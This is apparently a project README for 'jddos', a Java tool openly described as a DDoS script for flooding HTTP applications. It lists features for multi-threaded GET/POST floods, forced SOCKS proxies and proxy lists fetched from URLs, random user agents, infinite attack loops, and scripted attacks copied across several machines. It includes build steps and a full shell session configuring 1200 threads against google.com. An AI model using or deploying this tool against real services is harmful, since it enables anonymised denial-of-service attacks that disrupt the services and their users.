# jddos
Experimental Java based dDos tool
---

jDdos is dDos script that targets HTTP based applications. This script is written in Java and it's only experimental so **I do not take responsiblities for any usages**, you might use it at your own risks.


## Main features

- HTTP GET and POST (only json) support
- Accepts multiple threads
- Configurable headers
- Automatically adds random user agent to headers
- Accepts and forces you to use SOCKS proxy
- Can read list of SOCKS proxy from url
- Configurable number of threads running the attack.
- Distributed different proxies to between requests. Distributed requests between threads.
- Can run infinite attack until told to stop
- Configurable sleep time between request from each service (Default is random)
- Uses **Spring Shell**, therefore its easy to write an attack script and copy it into several machines


## RUN

First build the project

    mvn clean install

Run it
```
 $ docker build -t image/hammer .
 $ docker run -it image/hammer
```

Commands:

    add-get-request: Adds get request for attack
    add-header: Adds header
    add-post-request: Adds post request for attack
    add-proxy: Adds proxy - example => 127.0.0.1:9050
    clean: Cleans attack settings
    explain: Explains current config
    read-proxy-list: Reads proxy list from url
    running: Makes infinite running threads, default is false
    set-sleep: Sets exact sleep time between infinte loop of each thread. Default = 0 (Random sleep time)
    start: Runs hammer 
    stop: Stops hammer
    threads: Sets threads count

Example:
```
   shell:>add-proxy 127.0.0.1:9050
   2019-05-13 17:27:37.228  WARN 1 --- [           main] load.test.shell.hammer.Commands          : You cant add proxies to currently running jdDos! Do a restart
   2019-05-13 17:27:37.229  INFO 1 --- [           main] load.test.shell.hammer.Commands          : done
   
   shell:>add-get-request http://google.com
   2019-05-13 17:27:41.542  WARN 1 --- [           main] load.test.shell.hammer.Commands          : New requests wont effect running attack. You must restart attack
   2019-05-13 17:27:41.543  INFO 1 --- [           main] load.test.shell.hammer.Commands          : done
   
   shell:>threads 1200
   2019-05-13 17:27:45.230  INFO 1 --- [           main] load.test.shell.hammer.Commands          : done
   
   shell:>explain
   Addresses: 
   400 threads will make request to http://google.com
   400 threads will make request to http://localhost.com/post
   400 threads will make request to http://google.com
   Proxies: 
   127.0.0.1:9050
   127.0.0.1:9050
   Infinite requests: false
   Total threads count: 1200
   
   shell:>add-post-request --address http://localhost.com/post --data {\"name\":\"yuri_lenzi\"}
   2019-05-13 17:28:05.502  WARN 1 --- [           main] load.test.shell.hammer.Commands          : New requests wont effect running attack. you must restart attack
   2019-05-13 17:28:05.502  INFO 1 --- [           main] load.test.shell.hammer.Commands          : done
   shell:>start
```

To skip writing all commands each time, create a file named `scripts.txt` for example and enter all the commands in right order.
Then start `hammer` and enter:

    script --file /address/to/scripts.txt

Your attack configuration will load into the application.

